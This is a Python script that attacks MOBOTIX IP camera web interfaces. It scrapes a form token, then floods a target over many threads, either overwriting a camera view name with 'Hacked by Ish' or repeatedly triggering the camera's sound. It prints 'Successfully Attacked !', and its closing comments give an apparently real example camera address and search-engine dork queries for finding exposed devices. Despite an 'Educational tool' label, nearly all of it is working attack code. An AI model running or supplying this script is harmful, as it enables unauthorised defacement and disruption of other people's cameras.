import requests
from bs4 import BeautifulSoup
import threading

def get_synchronizer_token(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check for HTTP errors
        soup = BeautifulSoup(response.content, 'html.parser')
        synchronizer_token = soup.find('input', {'type': 'hidden', 'name': 'synchronizer_token'})['value']
        return synchronizer_token
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def simulate_user_action(ip, action):
    if action == "config":
        pay = "Hacked by Ish " * 99
        url = f'http://{ip}/control/multiwatcherconfig'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
          
            'Cookie': 'quickcontrolparam=display_mode'
        }
        try:
            t = get_synchronizer_token(f"http://{ip}/control/multiwatcherconfig?screen=Default'")
            if not t:
                t =""
        except:
            t = ""
        payload = {
            "synchronizer_token": t,
            'is_web_config': '1',
            'new_name': pay,
            'screen': 'Hhhh',
            'cam0_id': 'self',
            'cam0_refresh': '1',
            'cam0_notification': '1',
            'set': 'OK'
        }
        response = requests.post(url, headers=headers, data=payload)
        print(" \n Successfully Attacked !")
    elif action == "sound":
        url = f'http://{ip}:8090/control/rcontrol?action=sound&soundfile=Standard&dummy='
        headers = {
            'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'si,en;q=0.9,en-US;q=0.8,en-GB;q=0.7',
            'Cookie': 'client_preview_mode=off; quickcontrolparam=vptz_pos_load'
        }
        response = requests.get(url, headers=headers)
        print(" \n Successfully Attacked !")
    else:
        print("Invalid action. Please choose 'config' or 'sound'.")

def send_concurrent_requests(ip, action, num_threads, num_requests):
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=lambda: send_requests(ip, action, num_requests))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def send_requests(ip, action, num_requests):
    for _ in range(num_requests):
        simulate_user_action(ip, action)

# Educational tool
ip_address = input("Enter an IP address: ")
action = input("Choose action (config/sound): ")
num_threads = int(input("Enter the number of threads: "))
num_requests = int(input("Enter the number of requests per thread: "))

if action in ["config", "sound"]:
    synchronizer_token = get_synchronizer_token(f"http://{ip_address}/control/multiwatcherconfig?screen=Default'")
    if synchronizer_token:
        print(f"Synchronizer token: {synchronizer_token}")
        send_concurrent_requests(ip_address, action, num_threads, num_requests)
    else:
        print("Unable to retrieve synchronizer token. Potential security issue detected.")
else:
    print("Invalid action. Please choose 'config' or 'sound'.")


# example:> http://193.91.66.100/control/multiwatcherproxy

#inurl:/control/multiwatcherproxy
#inurl:/control/text intext:MOBOTIX
#inurl:/control/userimage.html
